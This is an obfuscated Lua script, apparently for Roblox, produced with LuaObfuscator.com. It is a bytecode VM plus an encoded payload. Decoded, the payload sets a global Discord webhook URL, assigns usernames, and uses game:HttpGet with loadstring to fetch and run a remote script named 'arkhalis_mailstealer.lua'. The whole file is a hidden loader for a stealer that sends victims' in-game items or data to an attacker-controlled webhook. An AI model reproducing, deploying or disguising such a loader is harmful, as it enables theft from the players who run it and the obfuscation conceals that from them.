--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v71=0;while true do if (v71==0) then v19=v0(v3(v30,1,1));return "";end end else local v72=v2(v0(v30,16));if v19 then local v83=v5(v72,v19);v19=nil;return v83;else return v72;end end end);local function v20(v31,v32,v33)if v33 then local v73=(v31/(2^(v32-(2 -1))))%((5 -3)^(((v33-1) -(v32-(1 -0))) + (2 -1))) ;return v73-(v73%1) ;else local v74=619 -(555 + 64) ;local v75;while true do if (v74==0) then v75=(933 -(857 + 74))^(v32-(569 -(58 + 309 + 201))) ;return (((v31%(v75 + v75))>=v75) and (928 -(214 + 713))) or (0 + (877 -(282 + 595))) ;end end end end local function v21()local v34=(2907 -(226 + 1044)) -(1523 + 114) ;local v35;while true do if (v34==(1 + 0)) then return v35;end if (v34==0) then v35=v1(v16,v18,v18);v18=v18 + (1 -0) ;v34=1066 -(68 + 997) ;end end end local function v22()local v36=0 -0 ;local v37;local v38;while true do if (v36==(118 -(32 + 85))) then return (v38 * (251 + 5)) + v37 ;end if (v36==(0 + 0)) then v37,v38=v1(v16,v18,v18 + (959 -(892 + 65)) );v18=v18 + 2 ;v36=2 -1 ;end end end local function v23()local v39=0;local v40;local v41;local v42;local v43;while true do if (v39==(1 -0)) then return (v43 * (30800116 -14022900)) + (v42 * ((48457 + 17429) -((345 -258) + 263))) + (v41 * (436 -(67 + 113))) + v40 ;end if (v39==(0 + 0)) then v40,v41,v42,v43=v1(v16,v18,v18 + 3 );v18=v18 + (956 -(802 + 150)) ;v39=2 -(2 -1) ;end end end local function v24()local v44=v23();local v45=v23();local v46=1 -0 ;local v47=(v20(v45,1 + 0 ,(1799 -782) -(915 + 82) ) * ((5 -3)^(19 + 13))) + v44 ;local v48=v20(v45,21,40 -9 );local v49=((v20(v45,1219 -(1069 + (1604 -(998 + 488))) )==((1 + 1) -1)) and  -(1 + 0)) or (1 -(772 -(201 + 571))) ;if (v48==0) then if (v47==(0 + (1138 -(116 + 1022)))) then return v49 * (0 -(438 -(145 + 293))) ;else v48=(4 -3) + 0 ;v46=(465 + 326) -(368 + 423) ;end elseif (v48==(6433 -4386)) then return ((v47==(18 -(10 + 8))) and (v49 * ((3 -2)/(442 -(416 + 26))))) or (v49 * NaN) ;end return v8(v49,v48-1023 ) * (v46 + (v47/((6 -(434 -(44 + 386)))^(23 + 29)))) ;end local function v25(v50)local v51;if  not v50 then v50=v23();if (v50==(0 -0)) then return "";end end v51=v3(v16,v18,(v18 + v50) -(3 -2) );v18=v18 + v50 ;local v52={};for v69=1, #v51 do v52[v69]=v2(v1(v3(v51,v69,v69)));end return v6(v52);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=1171 -(418 + 753) ;local v54;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v53==1) then local v76=0 + 0 ;while true do if (v76==1) then v53=1 + 1 ;break;end if ((0 + 0)==v76) then v56=nil;v57=nil;v76=1 + 0 ;end end end if (v53==(532 -(406 + 123))) then local v77=0;while true do if (v77~=(1769 -(1749 + 20))) then else v60=nil;v61=nil;v77=1;end if (v77==1) then v53=4;break;end end end if ((0 + 0)==v53) then local v78=1322 -(1249 + 73) ;while true do if (v78==(0 + 0)) then v54=1145 -(466 + 679) ;v55=nil;v78=1;end if ((2 -1)==v78) then v53=2 -1 ;break;end end end if (v53~=4) then else while true do if (v54==3) then v61=nil;while true do local v105=0;local v106;local v107;while true do if (v105==(1900 -(106 + 1794))) then v106=0 + 0 ;v107=nil;v105=1;end if (v105~=(1 + 0)) then else while true do if ((0 -0)==v106) then v107=0;while true do if (v107~=1) then else if (v55==2) then local v136=0 -0 ;local v137;while true do if (v136==(114 -(4 + 110))) then v137=584 -(57 + 527) ;while true do local v171=1427 -(41 + 1386) ;local v172;while true do if (v171==0) then v172=0;while true do if (v172~=0) then else if (v137~=1) then else return v59;end if (v137~=(103 -(17 + 86))) then else local v184=0 + 0 ;while true do if (v184==(0 -0)) then local v185=0 -0 ;while true do if (1==v185) then v184=1;break;end if (v185==0) then for v187=167 -(122 + 44) ,v23() do local v188=0;local v189;local v190;local v191;while true do if (v188==(0 -0)) then v189=0;v190=nil;v188=3 -2 ;end if (v188==(1 + 0)) then v191=nil;while true do if (v189~=0) then else local v198=0;while true do if (v198~=(1 + 0)) then else v189=1 -0 ;break;end if (v198~=0) then else v190=65 -(30 + 35) ;v191=nil;v198=1 + 0 ;end end end if ((1258 -(1043 + 214))==v189) then while true do if (v190==(0 -0)) then v191=v21();if (v20(v191,1213 -(323 + 889) ,2 -1 )==(580 -(361 + 219))) then local v200=0;local v201;local v202;local v203;local v204;while true do if (v200==(321 -(53 + 267))) then v203=nil;v204=nil;v200=2;end if (v200~=(0 + 0)) then else v201=0;v202=nil;v200=414 -(15 + 398) ;end if (v200==2) then while true do if (v201==(985 -(18 + 964))) then if (v20(v203,11 -8 ,2 + 1 )~=1) then else v204[3 + 1 ]=v61[v204[4]];end v56[v187]=v204;break;end if (v201==(850 -(20 + 830))) then v202=v20(v191,2,3 + 0 );v203=v20(v191,4,6);v201=127 -(116 + 10) ;end if (v201~=2) then else local v206=0 + 0 ;while true do if (v206==1) then v201=741 -(542 + 196) ;break;end if (v206~=(0 -0)) then else if (v20(v203,1,1)==(1 + 0)) then v204[2]=v61[v204[2 + 0 ]];end if (v20(v203,1 + 1 ,2)~=1) then else v204[7 -4 ]=v61[v204[7 -4 ]];end v206=1552 -(1126 + 425) ;end end end if (v201~=1) then else local v207=0;local v208;while true do if (v207==0) then v208=405 -(118 + 287) ;while true do if (v208~=0) then else local v215=0 -0 ;while true do if (v215==(1122 -(118 + 1003))) then v208=1;break;end if (v215~=0) then else v204={v22(),v22(),nil,nil};if (v202==0) then local v216=0;local v217;while true do if (v216==(0 -0)) then v217=0;while true do if ((0 + 0)~=v217) then else v204[3]=v22();v204[981 -(553 + 424) ]=v22();break;end end break;end end elseif (v202==1) then v204[5 -2 ]=v23();elseif (v202==(2 + 0)) then v204[3]=v23() -(2^16) ;elseif (v202==3) then local v222=0;local v223;while true do if (v222~=0) then else v223=0 + 0 ;while true do if (v223==(0 + 0)) then v204[2 + 1 ]=v23() -((2 + 0)^16) ;v204[8 -4 ]=v22();break;end end break;end end end v215=2 -1 ;end end end if (v208==1) then v201=2;break;end end break;end end end end break;end end end break;end end break;end end break;end end end for v192=2 -1 ,v23() do v57[v192-1 ]=v28();end v185=1;end end end if (v184==(1 + 0)) then v137=1;break;end end end break;end end break;end end end break;end end end break;end if (v107~=(0 -0)) then else local v115=0;while true do if (v115==0) then if (v55~=(753 -(239 + 514))) then else local v163=0;local v164;while true do if (v163~=(0 + 0)) then else v164=0;while true do if (v164~=(1329 -(797 + 532))) then else local v175=0 + 0 ;while true do if ((0 + 0)==v175) then v56={};v57={};v175=2 -1 ;end if (v175==(1203 -(373 + 829))) then v164=1;break;end end end if (v164~=(733 -(476 + 255))) then else v55=1;break;end if (v164~=1) then else local v176=0;while true do if (v176~=(1131 -(369 + 761))) then else v164=2 + 0 ;break;end if (v176~=(0 -0)) then else v58={};v59={v56,v57,nil,v58};v176=1 + 0 ;end end end end break;end end end if (v55==(1 -0)) then local v165=0;while true do if (v165==2) then v55=338 -(144 + 192) ;break;end if (v165==(216 -(42 + 174))) then local v173=0 + 0 ;while true do if (v173==1) then v165=1 + 0 ;break;end if (v173==(0 + 0)) then v60=v23();v61={};v173=1505 -(363 + 1141) ;end end end if (1~=v165) then else local v174=0;while true do if (v174~=(1581 -(1183 + 397))) then else v165=5 -3 ;break;end if (v174==0) then for v178=1,v60 do local v179=0;local v180;local v181;local v182;local v183;while true do if (2==v179) then while true do if (v180~=(1 + 0)) then else v183=nil;while true do if (v181~=(0 + 0)) then else local v194=0;local v195;local v196;while true do if (1~=v194) then else while true do if (v195~=(1975 -(1913 + 62))) then else v196=0;while true do if (v196==(0 + 0)) then local v199=0;while true do if (v199==(0 -0)) then v182=v21();v183=nil;v199=1934 -(565 + 1368) ;end if (v199~=(3 -2)) then else v196=1;break;end end end if (v196~=1) then else v181=1662 -(1477 + 184) ;break;end end break;end end break;end if (v194==(0 -0)) then v195=0 + 0 ;v196=nil;v194=857 -(564 + 292) ;end end end if ((1 -0)==v181) then if (v182==1) then v183=v21()~=(0 -0) ;elseif (v182==2) then v183=v24();elseif (v182~=(307 -(244 + 60))) then else v183=v25();end v61[v178]=v183;break;end end break;end if (v180==(0 + 0)) then local v186=476 -(41 + 435) ;while true do if (v186~=0) then else v181=1001 -(938 + 63) ;v182=nil;v186=1 + 0 ;end if (v186==(1126 -(936 + 189))) then v180=1 + 0 ;break;end end end end break;end if (v179~=1) then else v182=nil;v183=nil;v179=2;end if (v179~=0) then else v180=0;v181=nil;v179=1;end end end v59[3]=v21();v174=1;end end end end end v115=1614 -(1565 + 48) ;end if (v115==1) then v107=1;break;end end end end break;end end break;end end end break;end if (v54==0) then local v100=0;local v101;while true do if (v100~=0) then else v101=0;while true do if (v101==0) then v55=0 + 0 ;v56=nil;v101=1139 -(782 + 356) ;end if (v101~=(268 -(176 + 91))) then else v54=1;break;end end break;end end end if (v54==(2 -1)) then local v102=0 -0 ;while true do if ((1093 -(975 + 117))==v102) then v54=2;break;end if (v102~=(1875 -(157 + 1718))) then else v57=nil;v58=nil;v102=1;end end end if (v54~=(2 + 0)) then else local v103=0;local v104;while true do if (v103~=0) then else v104=0;while true do if (v104==(3 -2)) then v54=3;break;end if (v104~=(0 -0)) then else local v114=0;while true do if (v114==0) then v59=nil;v60=nil;v114=1;end if (v114==(1019 -(697 + 321))) then v104=2 -1 ;break;end end end end break;end end end end break;end if (v53==2) then local v79=0;while true do if (v79==0) then v58=nil;v59=nil;v79=1;end if (v79==1) then v53=5 -2 ;break;end end end end end local function v29(v62,v63,v64)local v65=0;local v66;local v67;local v68;while true do if (v65==1) then v68=v62[3];return function(...)local v84=v66;local v85=v67;local v86=v68;local v87=v27;local v88=1;local v89= -1;local v90={};local v91={...};local v92=v12("#",...) -1 ;local v93={};local v94={};for v98=0,v92 do if (v98>=v86) then v90[v98-v86 ]=v91[v98 + 1 ];else v94[v98]=v91[v98 + 1 ];end end local v95=(v92-v86) + 1 ;local v96;local v97;while true do local v99=0;while true do if (v99==0) then v96=v84[v88];v97=v96[1];v99=1;end if (1==v99) then if (v97<=10) then if (v97<=4) then if (v97<=1) then if (v97==0) then v88=v96[3];else v94[v96[2]]();end elseif (v97<=2) then v94[v96[2]]=v64[v96[3]];elseif (v97==3) then v94[v96[2]][v96[3]]=v96[4];else v94[v96[2]]=v96[3];end elseif (v97<=7) then if (v97<=5) then v94[v96[2]][v96[3]]=v96[4];elseif (v97==6) then local v142=v96[2];local v143=v94[v96[3]];v94[v142 + 1 ]=v143;v94[v142]=v143[v96[4]];else v94[v96[2]]=v96[3]~=0 ;end elseif (v97<=8) then local v121=v96[2];local v122,v123=v87(v94[v121](v13(v94,v121 + 1 ,v96[3])));v89=(v123 + v121) -1 ;local v124=0;for v131=v121,v89 do v124=v124 + 1 ;v94[v131]=v122[v124];end elseif (v97>9) then local v148=0;local v149;local v150;while true do if (v148==0) then v149=v96[2];v150=v94[v96[3]];v148=1;end if (v148==1) then v94[v149 + 1 ]=v150;v94[v149]=v150[v96[4]];break;end end else v94[v96[2]]=v96[3]~=0 ;end elseif (v97<=15) then if (v97<=12) then if (v97==11) then if (v94[v96[2]]==v96[4]) then v88=v88 + 1 ;else v88=v96[3];end else do return;end end elseif (v97<=13) then v94[v96[2]]();elseif (v97>14) then if (v94[v96[2]]==v96[4]) then v88=v88 + 1 ;else v88=v96[3];end else local v153=v96[2];v94[v153]=v94[v153](v13(v94,v153 + 1 ,v89));end elseif (v97<=18) then if (v97<=16) then local v125=v96[2];v94[v125]=v94[v125](v13(v94,v125 + 1 ,v89));elseif (v97==17) then v94[v96[2]]=v96[3];else v94[v96[2]]=v64[v96[3]];end elseif (v97<=19) then local v127=v96[2];local v128,v129=v87(v94[v127](v13(v94,v127 + 1 ,v96[3])));v89=(v129 + v127) -1 ;local v130=0;for v134=v127,v89 do local v135=0;while true do if (v135==0) then v130=v130 + 1 ;v94[v134]=v128[v130];break;end end end elseif (v97>20) then do return;end else v88=v96[3];end v88=v88 + 1 ;break;end end end end;end if (v65==0) then v66=v62[1];v67=v62[2];v65=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F4703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O3133373O38323332393O34373634372F73652O454B51774C676B694744645956624D324B703561594C51386B4F516B544864744E45306C3251484761536B5A4F4943577456784B2O72747965334165476B736D4D030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403363O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F61726B68616C69735F6D61696C737465616C65722E6C756103093O00557365726E616D653103053O00416D31306F03093O00557365726E616D6532035O001F3O0012113O00013O00260B3O000E000100020004143O000E0001002O12000100033O003005000100040005002O12000100063O002O12000200073O00200A000200020008001211000400094O0009000500014O0008000200054O001000013O00022O000D0001000100010004143O001E000100260B3O0001000100010004143O00010001001211000100013O00260B00010015000100020004143O001500010012113O00023O0004143O0001000100260B00010011000100010004143O00110001002O12000200033O0030050002000A000B002O12000200033O0030050002000C000D001211000100023O0004143O001100010004143O000100012O000C3O00017O00",v9(),...);end
